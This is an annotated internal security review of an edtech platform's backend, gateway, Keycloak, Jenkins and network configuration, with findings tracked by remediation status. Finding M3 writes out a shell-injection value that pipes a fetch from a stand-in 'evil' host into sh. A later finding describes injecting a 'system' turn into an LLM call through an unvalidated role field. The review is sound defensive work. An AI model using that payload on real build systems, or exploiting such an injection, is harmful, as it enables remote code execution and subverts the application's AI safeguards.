# hAIsir Security Review — 2026-07-02

Scope: `haisir-backend`, `haisir-frontend`, `haisir-deploy`, `haisir-specs`.
Reviewer: automated code audit (defensive). Goal: enterprise-grade, low-vulnerability posture suitable as a learning platform for later financial-grade work.

## TL;DR

The platform is already **well above average** for an edtech project. The gateway layer (APISIX + Coraza WAF PL2 + CrowdSec + OIDC/PKCE), the CI pipelines (Semgrep, Gitleaks, pip-audit, Trivy, SBOM, Sonar quality gate, 100% coverage), the distroless non-root images, and the supply-chain hardening (`--ignore-scripts`, pnpm `minimumReleaseAge`) are genuinely enterprise-grade. No committed secrets, no SQL injection, no command injection, no `dangerouslySetInnerHTML`/`eval`, and role/ownership enforcement (IDOR) is handled systematically at the query layer.

There is **no critical, remotely-exploitable zero-day** in the code I reviewed. The findings below are hardening gaps and fail-open defaults — the difference between "secure" and "financial-grade." Fix the High items first.

Severity legend: **High** = fix before you treat this as production-secure; **Medium** = expected at enterprise grade; **Low** = defense-in-depth / hygiene.

---

## Status annotation (2026-07-27)

> This review is a **dated artifact** — the body below is preserved as written on 2026-07-02.
> The annotations added under each finding record status as verified against live code on
> 2026-07-27, during Phase 7 scoping. Where a finding is now scoped for remediation, the Phase 7
> goal is named; the full task breakdown is in `Implementation_planning/TASKS.md`.
>
> Verification method: direct code audit of `haisir-backend`, `haisir-frontend`, `haisir-deploy`
> at backend `c82d466`, frontend `67a883c`, deploy `861705b`.
>
> **Lifecycle:** this document is *live* through Phase 7 — task T8.3.2 updates these annotations to
> final status at closeout. It is not redundant with the Phase 7 planning docs: the "What's already
> done well" section below is a dated **baseline attestation** recorded nowhere else, and
> `target/requirements/14_container_images.md` cites this file for Phase 8 container-UID context.
> Once Phase 7 closes and T8.3.2 is done, the right disposition is to move it to
> `Implementation_planning/archive/` rather than delete it — remediated reviews are the audit trail,
> and this platform is explicitly aiming at a posture where that trail matters.

| Finding | Status (2026-07-27) | Phase 7 goal |
|---|---|---|
| H1 — fail-open secret defaults | **FIXED** (Phase 5.5, BR-SEC-019) | — |
| H2 — JWT audience not validated | **OPEN** | G6.2 (BR-SEC-020) |
| H3 — Keycloak password policy + sslRequired | **OPEN** — zero movement | G6.4 |
| M1 — no CSP | **OPEN** — recommended fix was not implementable as written, see annotation | G5 |
| M2 — chunked-encoding size bypass | **OPEN**, and worse than described | G7.1 |
| M3 — Jenkins param injection | **PARTIAL** — deploy half-fixed, backend untouched | G7.2 |
| M4 — Tailscale dev tags `*:*` | **OPEN** — byte-identical | G7.3 |
| M5 — OIDC/etcd TLS verification off | **OPEN** | G6.3 |
| M6 — etcd auth disabled | **CONFIRMED FIXED for prod/staging** (re-verified 2026-07-31) — dev-only pattern, correctly isolated; regression guard (T7.5.3) still to build | T7.5.2 done, G7.5 |
| L1 — `.env_bak` not gitignored | **FIXED** | — |
| L2 — host `.env*` world-readable | **FIXED for prod**, open staging/dev (now hold no secrets) | G7.5 |
| L3 — deprecated `X-XSS-Protection` | **OPEN** — 4 plugin configs | G7.4 |
| L4 — dev conveniences | **CONFIRMED FIXED for prod** (re-verified 2026-07-31) — regression guard (T7.5.3) still to build | T7.5.2 done, G7.5 |
| L5 — `referer-restriction bypass_missing` | **RECORDED, deliberately not fixed** — accepted as a spam filter, not a boundary | T7.5.1 done, G7.5 |

**Not re-verified this pass** (host/infrastructure state rather than repo state): on-server file
modes beyond those visible locally, and live Tailscale ACL enforcement.

**Findings discovered after this review** — recorded here so this document is not read as a
complete picture. Full detail in `Implementation_planning/decisions.md` (2026-07-27) and
`target/requirements/16_gateway_waf.md`:

- **`OAUTH__KEYCLOAK__SSL_VERIFY=false` in prod and staging** (`prod/.env:39`, `staging/.env:39`) —
  disables TLS verification on the backend's token-introspection and Keycloak-Admin channels,
  contradicting this review's own praise of introspection as correctly fail-closed (BR-SEC-010). An
  on-path attacker can answer `active: true` for a revoked token. Now **BR-SEC-021**, Phase 7 G6.1.
- **Prompt injection via `ReviewChatMessage.role`** — unconstrained `str` plus
  `_DOMAIN_TO_LLM_ROLE.get(m.role, m.role)` lets a client inject a `system` turn into an
  authenticated LLM call. Invisible to any WAF. Phase 7 G3.1.
- **CVE-2026-21876 in OWASP CRS 4.14.0** (CVSS 9.3, multipart charset bypass; affects CRS
  3.3.x–3.3.7 and 4.0.0–4.21.0) — published 2026-01-06, after this review. Phase 7 G1.3/G2.1.
- **The WAF exclusions this review praised as "narrowly scoped and each justified — exemplary" have
  since become the opposite.** See the annotation on that line below.
- Six further infrastructure anomalies (APISIX `allow_admin` covering the whole Docker subnet,
  admin UI enabled behind a single static key, CrowdSec LAPI key over plaintext HTTP, OpenBao's DB
  engine at `sslmode=disable`, `.templated/` files at 0664, `sonarqube/.env` at 0664). Phase 7 G7.7.

---

## Findings

### H1 — Fail-open secret defaults (`csrf.secret` and `database_url` default to `"dummy"`)
> **[2026-07-27] FIXED.** `config.py:110` (`csrf.secret`), `:86-87` (`admin_client_id`/`admin_client_secret`) and `:314` (`database_url`) are now `Field(min_length=1)` with **no default**, so `Settings()` raises at import. `config.py:339-352` additionally scrubs the `ValidationError` so sibling secret values are not leaked in `.errors()`. Closed by Phase 5.5 (BR-SEC-019).

**Repo:** haisir-backend · `src/shared/config.py` (`CSRFSettings.secret`, `Settings.database_url`)
The app boots even when `CSRF__SECRET` / `DATABASE_URL` are unset, falling back to `"dummy"` (`min_length=1` enforces nothing). If a prod deploy ever misses the env var, **CSRF tokens are signed with a publicly-known key → forgeable → CSRF protection is silently void**. This is the classic "secure default that isn't."
**Fix:** Fail closed. On startup, if `security.is_production` and `csrf.secret in {"dummy",""}` (or `database_url == "dummy"`), raise and refuse to boot. Better: make them required with no default and provide a `.env.example`. Same treatment for `oauth.keycloak.admin_client_secret` when introspection is enabled.

### H2 — JWT audience not validated (`verify_aud: False`)
> **[2026-07-27] STILL OPEN.** `haisir-backend/src/auth/user.py:73` — `"verify_aud": False,  # flexible audience`. Unchanged. Now **BR-SEC-020**; Phase 7 G6.2. Note the sequencing risk: enabling this without first confirming APISIX-injected tokens carry the expected `aud` will 401 every request, so T6.2.1 verifies before T6.2.2 enforces.

**Repo:** haisir-backend · `src/auth/user.py` (`verify_token`)
Local JWKS validation checks signature, expiry, and issuer, but **not audience**. Any valid token from the realm — including the frontend client's own access token or a token minted for a *different* client — is accepted by the API (introspection only confirms the token is *active*, not that it targets this API). This is "audience confusion." The spec (`target/requirements/02_auth_and_roles.md:45`) already provisions an audience mapper adding `haisir-backend-admin` to `aud`, so the data to enforce this exists.
**Fix:** Set `verify_aud: True` with the expected audience, or explicitly assert the backend's client/audience is present in `aud` after decode. Confirm APISIX-injected tokens carry that audience first (they should, given the mapper).

### H3 — Keycloak realm: no password policy + `sslRequired: "none"`
> **[2026-07-27] STILL OPEN — zero movement.** `common/keycloak/01-realm.json`: no `passwordPolicy` key at all; `sslRequired: "none"` at `:10`; `bruteForceProtected: true` at `:9` with `failureFactor`/`permanentLockout`/`maxDeltaTimeSeconds` all absent, and nothing in `common/scripts/setup-keycloak.sh` sets them. Phase 7 G6.4.

**Repo:** haisir-deploy · `common/keycloak/01-realm.json`
- `passwordPolicy` is **absent** → no minimum length, complexity, history, or breach check. For a platform you want to grow toward financial-grade, this is a baseline gap.
- `sslRequired: "none"` disables Keycloak's own TLS enforcement. Even behind a TLS-terminating gateway, `external` (require SSL for non-private requests) is the correct posture; `none` allows credential/token flows over plain HTTP if anything ever reaches Keycloak directly.
**Fix:** Add a `passwordPolicy` (e.g. `length(12) and notUsername and notEmail and passwordHistory(3)`, and consider `notContainsUsername`/HaveIBeenPwned via `hashIterations`). Set `sslRequired: "external"`. Make brute-force params explicit (`failureFactor`, `permanentLockout`, `maxDeltaTimeSeconds`) rather than relying on Keycloak defaults. Consider requiring OTP/WebAuthn for `admin`/`institution_admin`.

### M1 — No Content-Security-Policy on the user-facing app
> **[2026-07-27] STILL OPEN — and the recommended fix is not implementable as written.** CSP is confirmed absent from all four plugin configs (the six other security headers *are* set there). But this review recommends a *nonce-based* CSP applied *at the gateway* via `response-rewrite` — those two requirements are incompatible. A nonce must be unique per request and appear on every inline tag in the rendered HTML; APISIX can set a header but cannot mint a value and inject it into the response body. A gateway CSP is necessarily static, forcing `script-src 'unsafe-inline'`. The nonce must be generated where the HTML is rendered. Corrected approach in `target/requirements/15_security_headers.md`; Phase 7 G5.
>
> Two facts that make this cheaper than the review assumed: `haisir-frontend/src/proxy.ts` already exists (Next 16 renamed `middleware`→`proxy`), and `src/app/csp-report/route.ts` already exists — though it currently accepts reports and **discards** them. 15 of 27 pages already carry `force-dynamic`; the remaining 12 (including all of `/onboarding/*` and `/admin/*`) are statically prerendered and must be opted into dynamic rendering first, since a build-time-rendered page cannot receive a per-request nonce.

**Repo:** haisir-frontend (`next.config.ts`) + haisir-deploy (route/plugin configs)
CSP is set **nowhere**: not in `next.config.ts` (no `headers()`), not on the frontend HTML routes (`10-home.json`, `99-catch-all` → `secured-anonymous`), and the backend only sets CSP on its own `/api` JSON responses. The SPA — the primary XSS target — ships with no CSP. XSS risk today is low (React escapes, `react-markdown` runs without `rehype-raw`), but CSP is the expected defense-in-depth layer.
**Fix:** Add a CSP to the frontend responses — cleanest at the gateway via `response-rewrite` on the frontend routes, mirroring the backend's directives (`default-src 'self'`, `frame-ancestors 'none'`, scoped `script-src`/`connect-src`). Next.js may need `'unsafe-inline'`/nonce handling for its hydration scripts — use a nonce-based policy rather than blanket `unsafe-inline`.

### M2 — Request-size / file-upload limits bypassable via chunked encoding
> **[2026-07-27] STILL OPEN, and worse than described.** The chunked-encoding bypass is confirmed at `request_middleware.py:151,169,194`. The upload *type* validation is not merely "trusts an attacker-controlled filename" — it is **dead code**: `_validate_file_uploads` reads a *request-level* `Content-Disposition`, but for `multipart/form-data` that header lives inside each body part, so it is always empty and the validator has never rejected anything (~45 lines). Separately, extraction uploads are **fully spooled to disk before** the 50 MB check (`admin_extraction.py:175-181`, `parent_extraction.py:182-188`), and a malformed `Content-Length` raises an unhandled `ValueError` → 500 rather than 400. Phase 7 G7.1.

**Repo:** haisir-backend · `src/auth/request_middleware.py` (`SecurityValidationMiddleware`)
Size and upload checks read `int(request.headers.get("content-length", 0))`. A client using `Transfer-Encoding: chunked` (no `Content-Length`) yields `0` → **all size/type gates are skipped**. Upload "type" validation also trusts the `Content-Disposition` filename, which is attacker-controlled.
**Mitigation in place:** APISIX WAF caps body size (`tx.max_file_size=1048576`) and the backend `file_validation.py` inspects real bytes on the upload path — so this middleware is belt-and-suspenders, not the only control.
**Fix:** Don't rely on `Content-Length`; enforce a real byte cap while streaming the body, and treat missing `Content-Length` on a body-bearing request as suspect. Validate uploads by sniffing magic bytes (already partly done) rather than the declared filename/extension.

### M3 — Jenkins: build parameters interpolated into shell (script injection)
> **[2026-07-27] PARTIALLY FIXED.** `haisir-deploy/Jenkinsfile.deploy` now uses `withEnv` + single-quoted `sh` for the remote-exec path (`:139-146`, `:233`), but `params.VERSION` is still Groovy-interpolated into `MANIFEST_PATH` (`:58`) and a `sh """..."""` block (`:89-107`), with validation only `!params.VERSION?.trim()` (`:75`) — no charset regex, so path traversal and quote-breakout remain. **`haisir-backend/Jenkinsfile` is untouched** — `params.TAG` interpolated at `:197-198`, `:209`, `:305-306`, `:340`, no validation. Phase 7 G7.2.

**Repos:** haisir-backend `Jenkinsfile` (`params.TAG`), haisir-deploy `Jenkinsfile.deploy` (`params.VERSION`)
`params.VERSION` is Groovy-interpolated into double-quoted `sh """..."""` blocks (e.g. `MANIFEST_PATH`, the version-match `echo`/`if`), and `params.TAG` into `docker build`/`docker tag`. Anyone able to trigger a parameterized build with `VERSION='1"; curl evil|sh; echo "'` gets shell execution on the Jenkins agent. (The deploy pipeline already correctly protects `REMOTE_HOST`/`REMOTE_USER` via `withEnv` + single-quoted `sh` — apply the same discipline to the params.) Path-traversal via `VERSION=../..` in `MANIFEST_PATH` is a lesser variant.
**Fix:** Validate params against a strict allowlist regex early (`VERSION` → `^\d+\.\d+(\.\d+)?$`, `TAG` → `^[A-Za-z0-9._-]+$`) and fail otherwise; pass them into `sh` via `withEnv`/`environment` + single-quoted scripts, never Groovy interpolation. Lock down who can trigger these jobs.

### M4 — Tailscale ACL: dev tags have `*:*` to the entire tailnet
> **[2026-07-27] STILL OPEN — byte-identical to this review.** `other/services/tailscale/tailscale.json:28-35` still grants `dst: ["*:*"]` to `tag:dev1`/`tag:in-dev1`/`tag:in-dev2`; SSH from dev tags to `tag:prod` still granted at `:72-84`. Phase 7 G7.3.

**Repo:** haisir-deploy · `other/services/tailscale/tailscale.json`
`tag:dev1`, `tag:in-dev1`, `tag:in-dev2` → `dst: ["*:*"]`, and `tag:dev1`/`tag:in-dev1` get SSH to `prod`, `staging`, `ci`, `compute`. A single compromised dev laptop = full network reach and prod SSH. Blast radius is large.
**Fix:** Apply least privilege — dev tags should reach only the services/ports they actually need (e.g. `tag:dev1 → tag:compute:22`, specific dev hosts), not `*:*`. Gate prod SSH behind a separate, rarely-held tag and Tailscale SSH check mode / session recording. Keep the tight CI→staging/prod grants you already have.

### M5 — OIDC/etcd TLS verification disabled
> **[2026-07-31] MOSTLY FIXED, one item remains — noted here for consistency with the M6 update above, not itself a T7.5.x task.** `openid-connect.ssl_verify` → `true` on all three plugin configs (T6.3.1), `etcd.tls.verify` → `true` (T6.3.2), CrowdSec LAPI moved to `https` + `ssl_verify: true` (T6.3.3) — all done 2026-07-31. Still open: OpenBao's database secrets engine connection (`sslmode=disable`, `common/openbao/bootstrap.sh:252`) — T6.3.4, deliberately parked pending a scope decision (fixing it means standing up Postgres server-side TLS, out of this task's original scope). Phase 7 G6.3 stays open on this alone.

**Repo:** haisir-deploy · `common/plugin_configs/03-secured-api.json` (`openid-connect.ssl_verify: false`), `common/apisix_conf/config.yaml` (`etcd.tls.verify: false`, `crowdsec ssl_verify: false`)
TLS peer verification is off on the APISIX→Keycloak OIDC channel and the APISIX→etcd channel. These are container-internal today (low risk), but "verify off" is a habit that doesn't survive a move to split hosts/mTLS, and etcd holds all gateway routing config.
**Fix:** Use proper internal CA certs and set `verify: true` (you already ship `etcd-client.pem`/`ca.pem` — turn on verification). At minimum, document these as internal-only and revisit before any multi-host topology.

### M6 — etcd runs with authentication disabled
> **[2026-07-31, T7.5.2] CONFIRMED FIXED for prod/staging; dev pattern intact and correctly isolated — re-verified directly against `common/docker-compose.yml`/`dev/docker-compose.yml` at today's HEAD, not just the 2026-07-27 planning note.** Prod/staging etcd (`common/docker-compose.yml:509`) sets `ETCD_CLIENT_CERT_AUTH=true` (`:525`), `read_only: true` (`:531`), `cap_drop: ALL`, and **publishes no host port**. `ALLOW_NONE_AUTHENTICATION=yes` survives only in `dev/docker-compose.yml:85`, whose etcd is also unpublished. **This is a dev-isolation assertion, not a live finding** — the residual work is a regression guard (T7.5.3: CI assertion that dev-only patterns never appear outside `dev/`), not a fix to the current state. Residual, tracked separately: `etcd.tls.verify` — was `false` at review time, **now `true`** (T6.3.2, done 2026-07-31, closing that part of M5).

**Repo:** haisir-deploy · `dev/docker-compose.yml` (`ALLOW_NONE_AUTHENTICATION=yes`, plain `http://0.0.0.0:2379`)
etcd is the source of truth for every APISIX route, upstream, and plugin secret. With no auth, any workload that can reach it on the docker network can rewrite routing (e.g. strip auth off `/api/*`). Dev-only as written, but confirm prod/staging use authenticated + TLS etcd (the `common` config points at `https://etcd:2379` with client certs, so verify the prod compose wires that and never falls back to the dev pattern).
**Fix:** Ensure prod/staging etcd requires client-cert auth (RBAC), is never published to a host port, and `ALLOW_NONE_AUTHENTICATION` is never set outside a throwaway dev network.

### L1 — `.env_bak` is not gitignored (latent secret leak)
> **[2026-07-27] FIXED.** `.gitignore:1` is now `.env*`, which covers `.env_bak`; no `.env_bak` exists on disk. A `git grep` for credential-shaped assignments across all tracked files returns only `.gitleaks.toml` patterns and `.secrets.baseline` hashes.

**Repo:** haisir-deploy · `.gitignore` ignores `.env`, `.env_info`, `.env.config*.sh` but **not** `.env_bak`. A real `prod/.env_bak` exists on disk and is currently untracked, but one `git add -A` away from being committed.
**Fix:** Add `.env_bak` (and a broad `*.env*` / `.env*` pattern with template exceptions) to `.gitignore`. Consider a pre-commit gitleaks hook on staged files (you already have gitleaks in CI — move it left).

### L2 — On-host secret files are world-readable/executable
> **[2026-07-27] FIXED for prod; open for staging/dev, but materially de-risked.** `prod/.env` and `prod/.env.config.sh` are now `-rw-------`. `staging/.env` is `-rwxr-xr-x`, `staging/.env.config.sh` `-rwxrwxr-x`, `dev/.env` `-rwxr-xr-x` — but since Phase 5.6 **those files contain zero secrets** (image tags, ports, Tailscale IPs, model specs, URLs only). Remaining plaintext outside the OpenBao boundary: `dev/.env`'s `PGADMIN_DEFAULT_PASSWORD` and `other/services/sonarqube/.env`'s `SONAR_DB_PASSWORD` (mode 0664). Phase 7 G7.5/G7.7.

**Repo:** haisir-deploy · `prod/.env`, `prod/.env_bak`, `prod/.env.config.sh` are mode `-rwxr-xr-x` (755).
Secrets readable by any local user and needlessly executable.
**Fix:** `chmod 600` on all `.env*` on the servers; they should be owned by the deploy user only. (This is a host-config fix, not a repo change.)

### L3 — Deprecated `X-XSS-Protection: 1; mode=block`
> **[2026-07-27] STILL OPEN.** Set on all four plugin configs. A four-file edit; now **BR-CSP-006**, Phase 7 G7.4 — sequenced with the CSP work since CSP is what replaces it.

**Repos:** haisir-backend `security_middleware.py` / config, haisir-deploy `response-rewrite`.
The `X-XSS-Protection` filter is deprecated and, when enabled, has itself caused vulnerabilities in some browsers. Modern guidance is `X-XSS-Protection: 0` and rely on CSP (see M1).
**Fix:** Set it to `0` and invest that mitigation into CSP.

### L4 — Dev conveniences that must never reach prod
> **[2026-07-31, T7.5.2] CONFIRMED FIXED for prod — re-verified directly against `common/docker-compose.yml`/`dev/docker-compose.yml` at today's HEAD (line numbers shifted since 2026-07-27 as Phase 7 added the OpenBao agent services; re-checked, not assumed).** Keycloak runs `command: [start]` (`:437-440`), `KC_HOSTNAME_STRICT=true` (`:438`), `KC_HTTP_ENABLED=false` (`:432`); Keycloak admin (`:447`) and APISIX admin (`:584`) port bindings default to `127.0.0.1`/resolve to the Tailscale IP in prod; **no pgAdmin service exists in the prod compose at all** (`grep -c pgadmin common/docker-compose.yml` → 0). Dev conveniences (`start-dev`, `KC_HOSTNAME_STRICT=false`, published Postgres/pgAdmin ports) are confined to `dev/docker-compose.yml`. **This is a dev-isolation assertion, not a live finding** — the residual work is a regression guard (T7.5.3: CI assertion that these dev-only patterns never appear outside `dev/`), not a fix to current state. Residual, unchanged: `dev/.env.config.sh:54` sets `KEYCLOAK_ADMIN_ALLOWED_CIDR="0.0.0.0/0"` — dev only; prod is `""` and staging is a `/32`.

**Repo:** haisir-deploy · `dev/docker-compose.yml`
Postgres `5432` and pgAdmin `5050` published to the host; pgAdmin `PGADMIN_CONFIG_MASTER_PASSWORD_REQUIRED=False`; Keycloak `start-dev` + `KC_HOSTNAME_STRICT=false`; APISIX admin API/dashboard published on `9180` and `allow_admin` includes the whole `{{DOCKER_NETWORK_SUBNET}}`. All acceptable for `dev`, all dangerous if copied to prod.
**Fix:** Keep these strictly in `dev/`. Verify prod: no published DB/admin ports, Keycloak in production mode with `KC_HOSTNAME_STRICT=true` + HTTPS, APISIX admin API bound to loopback/tailscale-admin CIDR only (the `13-keycloak-admin` route's IP-allowlist pattern is the model to follow).

### L5 — `referer-restriction` uses `bypass_missing: true`
> **[2026-07-31, T7.5.1] RECORDED — deliberately not fixed, accepted as a spam filter rather than a security boundary.** Re-verified today: still present in exactly the same seven files (`01-secured-authenticated.json`, `02-secured-anonymous.json`, `03-secured-api.json`, `04-secured-api-upload.json`, `01-keycloak-realms.json`, `13-keycloak-admin.json`, `14-keycloak-master-realm.json`). No code change made or intended — the real security boundary on every sensitive route is CSRF tokens (mutations), OIDC (`unauth_action: deny`), and IP allowlists (admin/Keycloak routes); `referer-restriction` only ever adds noise-reduction against casual cross-site form spam, and a missing/spoofed `Referer` bypassing it changes nothing about what actually gates access. Documented here as the accepted-risk record; no further action tracked against this item.

**Repo:** haisir-deploy · multiple route/plugin configs.
Requests with no `Referer` header skip the check — trivially bypassed by an attacker. It's a spam/noise filter, not a security control, and is correctly backed by CSRF tokens + OIDC + IP allowlists on sensitive routes. Just don't count it as a real boundary.

---

## What's already done well (keep doing this)

- **Gateway defense-in-depth:** OIDC + PKCE, `unauth_action: deny`, RS256 pinned, Coraza WAF at PL2 with anomaly threshold 5/4 and early blocking, CrowdSec bouncer, layered `limit-count`/`limit-conn`/`limit-req`, `uri-blocker`, server-token hiding. WAF rule exclusions are narrowly scoped and each is justified with a written rationale — exemplary.
  > **[2026-07-27] NO LONGER TRUE — this is now the phase's central finding.** Between 2026-07-01 and 2026-07-09 the exclusion block on `id:199110` grew across **seven rounds in nine days to 38 rule IDs**, using whole-request `ctl:ruleRemoveById` rather than field-scoped targeting — so the 942xxx SQLi, 932xxx RCE and 941xxx XSS families are disabled for headers, cookies and query args too on `POST /api/haitu/(topic-doubt|exam-review-chat)`. `12-api-exams-static.json` separately raises the anomaly threshold 5→12 and `tx.arg_length` to 50 MB to admit base64 image payloads — though its *field* exclusions there use the correct `SecRuleUpdateTargetByTag <tag> "!ARGS_POST:/field/"` form and are the reference example of the right pattern. Root cause: regex collection keys in `ctl:ruleRemoveTargetById` require **Coraza v3.5.0**, and the shipped build pins **v3.3.3** — so scoped exclusions were parsed as literal variable names and silently matched nothing. The written rationales remain genuinely exemplary; the scoping is not. Phase 7 G1–G4; see `target/requirements/16_gateway_waf.md`.
- **Backend authz:** every business route carries an auth dependency; only `/api/auth/csrf` and `/health` are public (correct). Self-service `assign-role` is server-side restricted to `{student, parent}` and rejects if a role already exists — no privilege escalation. Ownership/IDOR enforced at the query layer (`infrastructure/visibility.py`, `student_visibility_clause`) plus per-service checks (`HaituAccessDeniedError`, parent-link checks).
- **Injection-safe:** all SQL via SQLAlchemy with bound params (`text(_CONTENT_QUERY)` uses `:content_id`); no `subprocess`/`os.system`/`eval`/`pickle`; URL validator is https-only + exact-hostname allowlist and rejects protocol-relative `//evil.com`.
- **CSRF:** signed-token pattern via `fastapi-csrf-protect`, httpOnly+secure cookie, token held in a JS module variable (not localStorage), single-flight refresh + retry.
- **Frontend:** `react-markdown` without `rehype-raw` (no raw HTML), no `dangerouslySetInnerHTML`/`eval`; only the *role label* is in localStorage (not tokens — those are httpOnly gateway cookies); client-side route guards are UX-only with real enforcement server-side.
- **Images:** multi-stage builds on Chainguard distroless, non-root `65532`, hardened static-asset perms, no secrets in layers.
- **Supply chain:** pnpm `--ignore-scripts` + `minimumReleaseAge` cooldown, `--frozen-lockfile`, `uv sync --frozen`, pip-audit + SBOM (CycloneDX) + Trivy CRITICAL gate.
- **CI security:** Semgrep (owasp-top-ten/secrets), Gitleaks, mypy, ruff, bandit, Sonar quality gate, `--cov-fail-under=100`, registry login via `--password-stdin` + `withCredentials`, manual prod approval gate.
- **Token revocation:** RFC 7662 introspection enabled and **fail-closed** (503 when the IdP is unreachable) — the correct choice.

---

## Suggested remediation order

> **[2026-07-27] SUPERSEDED.** The ordering below reflects what was known on 2026-07-02. It is
> retained for the record but must not be followed as-is: H1 and L1 are since fixed, M6/L4 turned
> out already-correct for prod, and item 4's advice ("CSP on the frontend — gateway
> `response-rewrite`, nonce-based") is **not implementable** — a nonce cannot be minted by APISIX
> and injected into rendered HTML. The live sequence is Phase 7's goal tree in
> `Implementation_planning/PLAN.md` / `TASKS.md`, which additionally orders these against findings
> discovered after this review (the CRS CVE, the prompt-injection hole, and the Keycloak TLS gap).


1. **H1** — add a production startup guard that refuses `dummy`/empty secrets (small change, removes a silent CSRF-bypass footgun).
2. **H2** — turn on audience validation (verify APISIX token `aud` first).
3. **H3** — Keycloak password policy + `sslRequired: external` + explicit brute-force + admin MFA.
4. **M1** — CSP on the frontend (gateway `response-rewrite`, nonce-based).
5. **M3** — sanitize Jenkins build params; **M4** — tighten Tailscale dev ACLs off `*:*`.
6. **M2, M5, M6** — streaming size cap, TLS verify on internal channels, confirm prod etcd auth.
7. **L1–L5** — gitignore/`chmod` hygiene, `X-XSS-Protection: 0`, keep dev conveniences out of prod.

## Recommended follow-ups not covered by this pass

> **[2026-07-27] Status:** the IDOR test pass, authenticated ZAP DAST on staging, and gitleaks as a
> pre-commit hook are all carried forward in `PLAN.md`'s "Carried forward, not in this phase" list —
> still open, still worth doing, deliberately out of Phase 7's scope. The fourth item
> (**rate-limit keying**) is **RESOLVED**: `03-secured-api.json` now carries a `real-ip` plugin with
> `trusted_addresses`, so `remote_addr` in the `limit-count`/`limit-conn` plugins resolves to the
> real client IP rather than the proxy.


- A **dedicated IDOR test pass**: enumerate every object-returning endpoint and assert cross-tenant/cross-owner access returns 403/404 (the framework is solid; verify each handler actually applies `visibility.py` / owner checks per BR-SEC-004/005/012).
- **DAST**: you already have `Jenkinsfile.integration-dast` — make sure it runs authenticated ZAP against staging on every release, not just smoke tests.
- **Dependency/secret scanning "shift-left"**: run gitleaks as a pre-commit hook (not only in CI).
- **Rate-limit keying**: confirm `remote_addr` in the limit plugins resolves to the *real* client IP via the `real-ip` plugin on every route (else all users share one bucket behind the proxy).
